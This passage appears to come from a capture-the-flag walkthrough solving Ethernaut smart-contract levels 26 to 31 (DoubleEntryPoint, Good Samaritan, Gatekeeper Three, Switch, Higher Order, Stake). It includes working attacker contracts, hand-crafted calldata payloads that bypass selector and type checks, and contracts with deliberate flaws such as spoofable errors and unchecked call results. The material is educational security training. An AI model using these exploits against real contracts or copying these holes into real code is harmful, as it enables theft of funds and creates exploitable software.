contract LegacyToken is ERC20("LegacyToken", "LGT"), Ownable {
    DelegateERC20 public delegate;

    function mint(address to, uint256 amount) public onlyOwner {
        _mint(to, amount);
    }

    function delegateToNewContract(DelegateERC20 newContract) public onlyOwner {
        delegate = newContract;
    }

    function transfer(address to, uint256 value) public override returns (bool) {
        if (address(delegate) == address(0)) {
            return super.transfer(to, value);
        } else {
            return delegate.delegateTransfer(to, value, msg.sender);
        }
    }
}

contract DoubleEntryPoint is ERC20("DoubleEntryPointToken", "DET"), DelegateERC20, Ownable {
    address public cryptoVault;
    address public player;
    address public delegatedFrom;
    Forta public forta;

    constructor(address legacyToken, address vaultAddress, address fortaAddress, address playerAddress) {
        delegatedFrom = legacyToken;
        forta = Forta(fortaAddress);
        player = playerAddress;
        cryptoVault = vaultAddress;
        _mint(cryptoVault, 100 ether);
    }

    modifier onlyDelegateFrom() {
        require(msg.sender == delegatedFrom, "Not legacy contract");
        _;
    }

    modifier fortaNotify() {
        address detectionBot = address(forta.usersDetectionBots(player));

        // Cache old number of bot alerts
        uint256 previousValue = forta.botRaisedAlerts(detectionBot);

        // Notify Forta
        forta.notify(player, msg.data);

        // Continue execution
        _;

        // Check if alarms have been raised
        if (forta.botRaisedAlerts(detectionBot) > previousValue) revert("Alert has been triggered, reverting");
    }

    function delegateTransfer(address to, uint256 value, address origSender)
        public
        override
        onlyDelegateFrom
        fortaNotify
        returns (bool)
    {
        _transfer(origSender, to, value);
        return true;
    }
}
```

## Solution

### Contract Walkthrough

Given that the Solidity code for this level is quite long compared to other Ethernaut challenges, let's investigate the different pieces individually to better understand what's going on.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/access/Ownable.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";

interface DelegateERC20 {
    function delegateTransfer(address to, uint256 value, address origSender) external returns (bool);
}

interface IDetectionBot {
    function handleTransaction(address user, bytes calldata msgData) external;
}

interface IForta {
    function setDetectionBot(address detectionBotAddress) external;
    function notify(address user, bytes calldata msgData) external;
    function raiseAlert(address user) external;
}
```

The first few lines of the file are straightforward.
First, we import the `Ownable` and `ERC20` implementations from OpenZeppelin's contract library.
Next, we define three interfaces:

1. `DelegateERC20`, which includes a custom transfer function for ERC20s.
2. `IDetectionBot`, which tells us that detection bots should include a `handleTransaction()` function.
3. `IForta`, which includes bot-related functionality like notifications, alerts, and a function to set the detection bot's address.

We'll take a closer look at all of these functions in a bit.

To start, let's consider the first contract.

```solidity
contract Forta is IForta {
    mapping(address => IDetectionBot) public usersDetectionBots;
    mapping(address => uint256) public botRaisedAlerts;

    function setDetectionBot(address detectionBotAddress) external override {
        usersDetectionBots[msg.sender] = IDetectionBot(detectionBotAddress);
    }

    function notify(address user, bytes calldata msgData) external override {
        if (address(usersDetectionBots[user]) == address(0)) return;
        try usersDetectionBots[user].handleTransaction(user, msgData) {
            return;
        } catch {}
    }

    function raiseAlert(address user) external override {
        if (address(usersDetectionBots[user]) != msg.sender) return;
        botRaisedAlerts[msg.sender] += 1;
    }
}
```

The first thing we notice is that this contract implements the `IForta` interface.
In addition to the `setDetectionBot()`, `notify()`, and `raiseAlert()` functions, we see two mappings.
`usersDetectionBots` is a mapping from users to detection bots, i.e., given a user address, the mapping will return the associated detection bot.
`botRaisedAlerts`, on the other hand, tracks how many alerts a given detection bot has already raised.

Let's take a closer look at the functions:

- `setDetectionBot()` allows anyone to register a new detection bot for themselves by providing the bot's address. Notice that each user can only have one detection bot at any given time.
- `notify()` first checks whether the specified user has already registered a detection bot. If the user didn't, it simply returns. If the user did, it tries to call `handleTransaction()` on the user's detection bot and returns, if successful. If the call to `handleTransaction()` is not successful, it does nothing.
- `raiseAlert()` first checks that the caller is the specified user's bot and, if so, raises the bot alert count by 1.

Now that we have a basic understanding of the `Forta` contract, let's take a closer look at the `CryptoVault` contract:

```solidity
contract CryptoVault {
    address public sweptTokensRecipient;
    IERC20 public underlying;

    constructor(address recipient) {
        sweptTokensRecipient = recipient;
    }

    function setUnderlying(address latestToken) public {
        require(address(underlying) == address(0), "Already set");
        underlying = IERC20(latestToken);
    }

    /*
    ...
    */

    function sweepToken(IERC20 token) public {
        require(token != underlying, "Can't transfer underlying token");
        token.transfer(sweptTokensRecipient, token.balanceOf(address(this)));
    }
}
```

The level description provides a nice summary, which is why I simply quote it here:

_This level features a `CryptoVault` with special functionality, the `sweepToken` function. This is a common function used to retrieve tokens stuck in a contract. The `CryptoVault` operates with an underlying token that can't be swept, as it is an important core logic component of the `CryptoVault`. Any other tokens can be swept._ 

The remaining details of the `CryptoVault` contract should be self-explanatory.

Next, let's take a closer look at the `LegacyToken` contract:

```solidity
contract LegacyToken is ERC20("LegacyToken", "LGT"), Ownable {
    DelegateERC20 public delegate;

    function mint(address to, uint256 amount) public onlyOwner {
        _mint(to, amount);
    }

    function delegateToNewContract(DelegateERC20 newContract) public onlyOwner {
        delegate = newContract;
    }

    function transfer(address to, uint256 value) public override returns (bool) {
        if (address(delegate) == address(0)) {
            return super.transfer(to, value);
        } else {
            return delegate.delegateTransfer(to, value, msg.sender);
        }
    }
}
```

We can see that `LegacyToken` is an ownable ERC20 implementation. 
In addition to the standard ERC20 interface and `Ownable`'s functions, the `LegacyToken` contract implements three additional functions:

- `mint()` can be used by the owner to mint `amount` tokens into `to`'s account.
- `delegateToNewContract()` allows the owner to set a new `delegate`. (We will take a closer look at a contract that implements the `DelegateERC20` interface in a bit.)
- `transfer()` is either just a normal ERC20 `transfer()` or a `delegateTransfer()` depending on whether or not a `delegate` has been set.

Lastly, let's consider the `DoubleEntryPoint` contract:

```solidity
contract DoubleEntryPoint is ERC20("DoubleEntryPointToken", "DET"), DelegateERC20, Ownable {
    address public cryptoVault;
    address public player;
    address public delegatedFrom;
    Forta public forta;

    constructor(address legacyToken, address vaultAddress, address fortaAddress, address playerAddress) {
        delegatedFrom = legacyToken;
        forta = Forta(fortaAddress);
        player = playerAddress;
        cryptoVault = vaultAddress;
        _mint(cryptoVault, 100 ether);
    }

    modifier onlyDelegateFrom() {
        require(msg.sender == delegatedFrom, "Not legacy contract");
        _;
    }

    modifier fortaNotify() {
        address detectionBot = address(forta.usersDetectionBots(player));

        // Cache old number of bot alerts
        uint256 previousValue = forta.botRaisedAlerts(detectionBot);

        // Notify Forta
        forta.notify(player, msg.data);

        // Continue execution
        _;

        // Check if alarms have been raised
        if (forta.botRaisedAlerts(detectionBot) > previousValue) revert("Alert has been triggered, reverting");
    }

    function delegateTransfer(address to, uint256 value, address origSender)
        public
        override
        onlyDelegateFrom
        fortaNotify
        returns (bool)
    {
        _transfer(origSender, to, value);
        return true;
    }
}
```

At the top of the contract, we see that it keeps track of the `cryptoVault` and the `player` as well as the `Forta` contract and the `delegatedFrom`, which is set to the address of the `LegacyToken`.
The constructor initializes all of the aforementioned state variables and mints 100 DET to the vault.
Next, we see that there's an `onlyDelegateFrom()` modifier that checks whether the function caller is the `LegacyToken`.
In addition, there is a second modifier, `fortaNotify()`, that

1. determines the old number of bot alerts,
2. executes the logic of the function it is applied to, and
3. reverts execution if new alerts have been raised.

Notice that this is exactly the functionality that will later allow us to prevent attacks using a detection bot.
Lastly, there is the `delegateTransfer()` function that comes with both the `onlyDelegateFrom` and `fortaNotify` modifiers and simply transfers the specified `value` from `origSender` to `to`.

### Vulnerability

While the level's Solidity code is quite a lot compared to other Ethernaut challenges, the level description already tells us that the bug we're looking for is located in the `CryptoVault` contract.

_"In this level you should figure out where the bug is in CryptoVault and protect it from being drained out of tokens."_

Now that we have a good overview of all the different code parts of this level, it's relatively straightforward to spot that we can drain all tokens from the vault by calling `sweepToken()` and specifying the `LegacyToken` contract as the parameter.

### Mitigation

To prevent this attack, we must create a Forta detection bot that implements the `IDetectionBot` interface.
Notice that our detection bot's `handleTransaction()` function will be called by the `notify()` function of the `Forta` contract.
Furthermore, notice that our bot must call `raiseAlert()` on its caller, i.e., on the `Forta` contract.

Now, to prevent the attack, recall the various steps involved:
First, we call `sweepToken()` of `CryptoVault`, passing `LegacyToken` as the `token` parameter.
Subsequently, there will be a message call to the `delegateTransfer()` function of `DoubleEntryPoint`.
The data of this message call is what our bot will receive on `handleTransaction()` because `delegateTransfer()` has the `fortaNotify` modifier applied to it.

Note that the only thing we can use to trigger our alert is the `origSender` parameter, which will be the address of `CryptoVault` during our attack.
Therefore, our bot can simply check the value of that parameter in the calldata and raise an alert if the value of `origSender` equals the address of the `CryptoVault`.

To implement this check, you will need to have a thorough understanding of [Solidity's Contract ABI Specification](https://docs.soliditylang.org/en/v0.8.15/abi-spec.html#abi).
Otherwise, it will be quite hard to grasp how the calldata in question is structured.

Before we take a closer look at the calldata, notice that our bot's `handleTransaction()` is called with the same `msg.data` passed to `notify()`.
Hence, during `handleTransaction`, the calldata will have the actual calldata to call that function and the `delegateCall()` calldata as an argument.

We, therefore, have the following table:

| Position | Bytes | Type                  | Value                                                         |
|----------|-------|-----------------------|---------------------------------------------------------------|
| 0x00     | 4     | `bytes4`              | Function selector of `handleTransaction()`                    |
| 0x04     | 32    | `address` (padded)    | `user` parameter                                              |
| 0x24     | 32    | `uint256`             | Offset of `msgData`, 0x40 in this case                        |
| 0x44     | 32    | `uint256`             | Length of `msgData`, 0x64 in this case                        |
| 0x64     | 4     | `bytes4`              | Function selector of `delegateTransfer()`                     |
| 0x68     | 32    | `address` (padded)    | `to` parameter                                                |
| 0x88     | 32    | `uint256`             | `value` parameter                                             |
| **0xa8** |**32** |**`address` (padded)** | **`origSender` parameter**                                    |
| 0xc8     | 28    | padding               | 0-padding as per the 32-byte arguments rule of encoding bytes |

With this knowledge, we can finally implement our detection bot as follows:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IDetectionBot {
    function handleTransaction(address user, bytes calldata msgData) external;
}

interface IForta {
    function raiseAlert(address user) external;
}

contract MyDetectionBot is IDetectionBot {
    address public immutable CRYPTO_VAULT;

    constructor(address cryptoVault) {
        CRYPTO_VAULT = cryptoVault;
    }

    // Comment out msgDate to silence "unused parameter" warning
    function handleTransaction(address user, bytes calldata /* msgData */) external {
        // Get origSender from calldata
        address origSender;
        assembly {
            origSender := calldataload(0xa8)
        }

        // Raise alert if msg.sender is the CryptoVault contract
        if (origSender == CRYPTO_VAULT) {
            IForta(msg.sender).raiseAlert(user);
        }
    }
}
```

When deploying the bot, we need to pass the `CryptoVault`'s address as a constructor parameter.
Notice that we can retrieve this address in the Ethernaut console via:

```javascript
await contract.cryptoVault()
```

After the bot has been deployed, the only thing that is left to do is calling `setDetectionBot()` on the `Forta` contract, passing our bot's address as the parameter.
Therefore, we first determine the `Forta` contract address in the Ethernaut console via

```javascript
await contract.forta()
```
and subsequently call `setDetectionBot()` via Cast:

```bash
cast send <your Forta contract address> "setDetectionBot(address)" <your detection bot address> --rpc-url <your RPC URL> --private-key <your private key>
```

Once the bot has been successfully set, you can submit the level instance to complete the challenge.

# 27. Good Samaritan

## Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "openzeppelin-contracts-08/utils/Address.sol";

contract GoodSamaritan {
    Wallet public wallet;
    Coin public coin;

    constructor() {
        wallet = new Wallet();
        coin = new Coin(address(wallet));

        wallet.setCoin(coin);
    }

    function requestDonation() external returns (bool enoughBalance) {
        // donate 10 coins to requester
        try wallet.donate10(msg.sender) {
            return true;
        } catch (bytes memory err) {
            if (keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)) {
                // send the coins left
                wallet.transferRemainder(msg.sender);
                return false;
            }
        }
    }
}

contract Coin {
    using Address for address;

    mapping(address => uint256) public balances;

    error InsufficientBalance(uint256 current, uint256 required);

    constructor(address wallet_) {
        // one million coins for Good Samaritan initially
        balances[wallet_] = 10 ** 6;
    }

    function transfer(address dest_, uint256 amount_) external {
        uint256 currentBalance = balances[msg.sender];

        // transfer only occurs if balance is enough
        if (amount_ <= currentBalance) {
            balances[msg.sender] -= amount_;
            balances[dest_] += amount_;

            if (dest_.isContract()) {
                // notify contract
                INotifyable(dest_).notify(amount_);
            }
        } else {
            revert InsufficientBalance(currentBalance, amount_);
        }
    }
}

contract Wallet {
    // The owner of the wallet instance
    address public owner;

    Coin public coin;

    error OnlyOwner();
    error NotEnoughBalance();

    modifier onlyOwner() {
        if (msg.sender != owner) {
            revert OnlyOwner();
        }
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function donate10(address dest_) external onlyOwner {
        // check balance left
        if (coin.balances(address(this)) < 10) {
            revert NotEnoughBalance();
        } else {
            // donate 10 coins
            coin.transfer(dest_, 10);
        }
    }

    function transferRemainder(address dest_) external onlyOwner {
        // transfer balance left
        coin.transfer(dest_, coin.balances(address(this)));
    }

    function setCoin(Coin coin_) external onlyOwner {
        coin = coin_;
    }
}

interface INotifyable {
    function notify(uint256 amount) external;
}
```

## Solution

The goal of this challenge is to drain the `Wallet`.

To do so, we can use the following attacker contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGoodSamaritan {
    function requestDonation() external returns (bool);
}

contract GoodSamaritanAttacker {
    IGoodSamaritan public immutable VICTIM;

    error NotEnoughBalance();

    constructor(address victim) {
        VICTIM = IGoodSamaritan(victim);
    }

    function attack() external {
        VICTIM.requestDonation();
    }

    function notify(uint256 amount) external pure {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }
}
```

Let's look at the different stages of the `attack()` function call to understand what's happening:

1. `attack()` will call `requestDonation()` to trigger a transfer of 10 tokens to our attacker contract.
2. The `Coin`'s `transfer()` function will then call our attacker's `notify()` function and since the `amount` will be 10, it'll revert.
3. This revert is bubbled up through the call chain until it is caught by the `catch` in the try-catch block of `GoodSamaritan`'s `requestDonation()` function.
4. Since the custom error we used to revert has the same signature as the original `NotEnoughBalance()` error, the `transferRemainder()` function will be called next, transferring the wallet's entire balance to our attacker.

Notice that the `if (amount == 10)` statement in our `notify()` function is crucial for `transferRemainder()` to not revert.

As we can see from this challenge, it is not safe to assume that an error was thrown by the immediate target of the contract call. 
Any other contract further down in the call chain can declare the same error and throw it at an unexpected location.

# 28. Gatekeeper Three

## Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SimpleTrick {
    GatekeeperThree public target;
    address public trick;
    uint256 private password = block.timestamp;

    constructor(address payable _target) {
        target = GatekeeperThree(_target);
    }

    function checkPassword(uint256 _password) public returns (bool) {
        if (_password == password) {
            return true;
        }
        password = block.timestamp;
        return false;
    }

    function trickInit() public {
        trick = address(this);
    }

    function trickyTrick() public {
        if (address(this) == msg.sender && address(this) != trick) {
            target.getAllowance(password);
        }
    }
}

contract GatekeeperThree {
    address public owner;
    address public entrant;
    bool public allowEntrance;

    SimpleTrick public trick;

    function construct0r() public {
        owner = msg.sender;
    }

    modifier gateOne() {
        require(msg.sender == owner);
        require(tx.origin != owner);
        _;
    }

    modifier gateTwo() {
        require(allowEntrance == true);
        _;
    }

    modifier gateThree() {
        if (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false) {
            _;
        }
    }

    function getAllowance(uint256 _password) public {
        if (trick.checkPassword(_password)) {
            allowEntrance = true;
        }
    }

    function createTrick() public {
        trick = new SimpleTrick(payable(address(this)));
        trick.trickInit();
    }

    function enter() public gateOne gateTwo gateThree {
        entrant = tx.origin;
    }

    receive() external payable {}
}
```

## Solution

The goal of this level is to register yourself as an `entrant`.

To solve the challenge, we can use the following attacker contract:

```solidity 
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperThree {
    function construct0r() external;
    function enter() external;
}

contract GatekeeperThreeAttacker {
    IGatekeeperThree public immutable VICTIM;

    constructor(address victim) {
        VICTIM = IGatekeeperThree(victim);
    }

    function becomeOwner() external {
        VICTIM.construct0r();
    }

    function enter() external {
        VICTIM.enter();
    }

    receive() external payable {
        revert("No donations pls");
    }
}
```

After deploying this contract, we can use its `becomeOwner()` function to claim ownership of the victim.
This will allow us to pass `gateOne()`.

To pass `gateTwo()`, we must call `getAllowance()` with the correct password.
By looking at the level's code, we can see that we first need to create a `SimpleTrick` contract using the `createTrick()` function.
This is easily achieved via the Ethernaut console:

```javascript
await contract.createTrick()
```

Next, we can determine `SimpleTrick`'s address via:

```javascript
await contract.trick()
```

In my case, it's 0x2379f9794f70B7384f6Ea9baeDC5A212daF9c9E2.
Knowing this address, we can now inspect `SimpleTrick`'s third storage slot, which contains the "private" password:

```bash
cast storage 0x2379f9794f70B7384f6Ea9baeDC5A212daF9c9E2 2 --rpc-url $SEP_RPC_URL
# Result: 0x000000000000000000000000000000000000000000000000000000006665ed70
```

Since `getAllowance()` requires us to provide the password as a `uint256`, we need to convert this output accordingly:

```bash
cast to-dec 0x000000000000000000000000000000000000000000000000000000006665ed70
# Result: 1717955952
```

We can now call `getAllowance()`, passing in 1717955952 for the `password` parameter.

Now, to pass first condition of the third gate, we send 0.0011 ether to the level instance (e.g., using MetaMask).
The reverting `receive()` function we included in our attacker ensures that we also pass the second condition. 

Finally, we can call `enter()` on our attacker contract to complete the challenge.

# 29. Switch

## Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Switch {
    bool public switchOn; // switch is off
    bytes4 public offSelector = bytes4(keccak256("turnSwitchOff()"));

    modifier onlyThis() {
        require(msg.sender == address(this), "Only the contract can call this");
        _;
    }

    modifier onlyOff() {
        // we use a complex data type to put in memory
        bytes32[1] memory selector;
        // check that the calldata at position 68 (location of _data)
        assembly {
            calldatacopy(selector, 68, 4) // grab function selector from calldata
        }
        require(selector[0] == offSelector, "Can only call the turnOffSwitch function");
        _;
    }

    function flipSwitch(bytes memory _data) public onlyOff {
        (bool success,) = address(this).call(_data);
        require(success, "call failed :(");
    }

    function turnSwitchOn() public onlyThis {
        switchOn = true;
    }

    function turnSwitchOff() public onlyThis {
        switchOn = false;
    }
}
```

## Solution

The goal of this challenge is to set the `switchOn` boolean to `true`.
In other words, we need to find a way to call the `turnSwitchOn()` function.
Notice that we can't call this function directly because of the `onlyThis()` modifier.
Instead, we need to construct an appropriate call to `flipSwitch()`.

The naive attempt of executing 

```javascript
await contract.flipSwitch("0x76227e12") // 0x76227e12 is the selector of turnSwitchOn()
```

won't work either because of the `onlyOff()` modifier.

Let us investigate this in more detail by calling `turnSwitchOff()` through `flipSwitch()` and taking a closer look at how the calldata is structured:

```javascript
await contract.flipSwitch("0x20606e15") // 0x20606e15 is the selector of turnSwitchOff()
```

Inspecting the resulting transaction on Etherscan in the "More Details" section, we get the following calldata structure:

```
Function: flipSwitch(bytes _data) ***

MethodID: 0x30c13ade
[0]:  0000000000000000000000000000000000000000000000000000000000000020
[1]:  0000000000000000000000000000000000000000000000000000000000000004
[2]:  20606e1500000000000000000000000000000000000000000000000000000000
```

The first four bytes are 0x30c13ade, which is the function selector of `flipSwitch()`.
Since the `_data` parameter has the _dynamic_ datatype `bytes`, the next 32 bytes are to be interpreted as the location of the data part of the function parameter.
20 in hex is 32 in decimal, telling us that the actual data part of the function parameter starts at position 32 (ignoring the first four bytes of the calldata that correspond to the function selector).
From the [official Formal Specification of ABI Encoding](https://docs.soliditylang.org/en/latest/abi-spec.html#formal-specification-of-the-encoding), we know that `[1]` is the number of bytes encoded as a `uint256` (in our case, 4 bytes) while `[2]` represents the actual value of the byte sequence (in our case, 20606e15).

Now that we have a better picture of the calldata, let's discuss how we can manipulate it to solve the level:
Notice that `[2]` needs to stay intact since the `onlyOff()` modifier requires the `offSelector` to be present at position 68.
However, we can add two more words that direct the call to `turnSwitchOn()` instead of `turnSwitchOff()` and, at the same time, manipulate `[0]` so that the location of the data part is 96 (0x60) instead of 32 (0x20):

```
Function: flipSwitch(bytes _data) ***

MethodID: 0x30c13ade
[0]:  0000000000000000000000000000000000000000000000000000000000000060
[1]:  0000000000000000000000000000000000000000000000000000000000000004
[2]:  20606e1500000000000000000000000000000000000000000000000000000000
[3]:  0000000000000000000000000000000000000000000000000000000000000004
[4]:  76227e1200000000000000000000000000000000000000000000000000000000
```

This way, `[1]` and `[2]` will be ignored for the actual function call yet the `offSelector` will be present at position 68, allowing us to successfully pass the `onlyOff()` modifier while still making the call to `turnSwitchOn()` via `[3]` and `[4]`.

As a conclusion, we can solve the level by issuing the following command in the Ethernaut console:

```javascript
await sendTransaction({from: "<your player address>", to: '<your level instance address>', input: "0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000420606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000"})
```

# 30. Higher Order

## Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

contract HigherOrder {
    address public commander;

    uint256 public treasury;

    function registerTreasury(uint8) public {
        assembly {
            sstore(treasury_slot, calldataload(4))
        }
    }

    function claimLeadership() public {
        if (treasury > 255) commander = msg.sender;
        else revert("Only members of the Higher Order can become Commander");
    }
}
```

## Solution

The goal of this challenge is to become the `commander` by setting `treasury` to a value greater than 255.

If we naively try to achieve this, e.g., via

```javascript
await contract.registerTreasury(256)
```

the function's parameter type validation will prevent the transaction from succeeding.

If we, however, specify the calldata manually and send it off via `sendTransaction`, we can simply change one of the higher-order zeros to 1, bypassing the function's type check:

```javascript
await sendTransaction({from: "<your player address>", to: "<your level instance address>", input: "0x211c85ab00000000000000000000000000000000000000000000000000000000000001ff"})
```

In the command above, `211c85ab` is the function selector of `registerTreasury()` and `00000000000000000000000000000000000000000000000000000000000001ff` is the 32-byte word that corresponds to the decimal number 511 when interpreted as a `uint256`.

All that is left to do is to issue 

```javascript
await contract.claimLeadership()
```

in the Ethernaut console in order to complete the level.

# 31. Stake

## Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract Stake {

    uint256 public totalStaked;
    mapping(address => uint256) public UserStake;
    mapping(address => bool) public Stakers;
    address public WETH;

    constructor(address _weth) payable{
        totalStaked += msg.value;
        WETH = _weth;
    }

    function StakeETH() public payable {
        require(msg.value > 0.001 ether, "Don't be cheap");
        totalStaked += msg.value;
        UserStake[msg.sender] += msg.value;
        Stakers[msg.sender] = true;
    }
    function StakeWETH(uint256 amount) public returns (bool){
        require(amount >  0.001 ether, "Don't be cheap");
        (,bytes memory allowance) = WETH.call(abi.encodeWithSelector(0xdd62ed3e, msg.sender,address(this)));
        require(bytesToUint(allowance) >= amount,"How am I moving the funds honey?");
        totalStaked += amount;
        UserStake[msg.sender] += amount;
        (bool transfered, ) = WETH.call(abi.encodeWithSelector(0x23b872dd, msg.sender,address(this),amount));
        Stakers[msg.sender] = true;
        return transfered;
    }

    function Unstake(uint256 amount) public returns (bool){
        require(UserStake[msg.sender] >= amount,"Don't be greedy");
        UserStake[msg.sender] -= amount;
        totalStaked -= amount;
        (bool success, ) = payable(msg.sender).call{value : amount}("");
        return success;
    }
    function bytesToUint(bytes memory data) internal pure returns (uint256) {
        require(data.length >= 32, "Data length must be at least 32 bytes");
        uint256 result;
        assembly {
            result := mload(add(data, 0x20))
        }
        return result;
    }
}
```

## Solution

The goal of this level is to manipulate the level instance's contract state such that:

1. The `Stake` contract's ETH balance is greater than 0.
2. `totalStaked` is greater than the `Stake` contract's ETH balance.
3. Our player EOA is registered as a staker.
4. Our player EOA's staked balance is 0.

To fulfill requirements 3. and 4., we first call `StakeETH()` and subsequently `Unstake()`, specifying the first call's value as the second call's `amount`.

To fulfill requirement 1., we can use an account different from our player EOA (let's call that account "minion") and call `StakeETH()` from our minion's account.
Notice that this leaves requirements 3. and 4. intact.

Lastly, to fulfill requirement 2., we first notice that `0xdd62ed3e` is the function selector for `WETH`'s `allowance()` while `0x23b872dd` is the selector for `transferFrom()`.
Furthermore, we see that the return value of the low-level call

```solidity
(bool transfered, ) = WETH.call(abi.encodeWithSelector(0x23b872dd, msg.sender,address(this),amount));
```

is not properly validated.
In other words, `StakeWETH()` does not revert if the external function call reverts.
Instead, it simply continues execution.

Therefore, we can fulfill requirement 2. by having our minion call

1. `approve()` on the `WETH` contract, specifying a non-zero `_value` and the level instance as the `_spender` (to determine `WETH`'s address, use `await contract.WETH()` in the Ethernaut console). 
2.  `StakeWETH()` specifying the allowance given in step 1. as the `amount`.
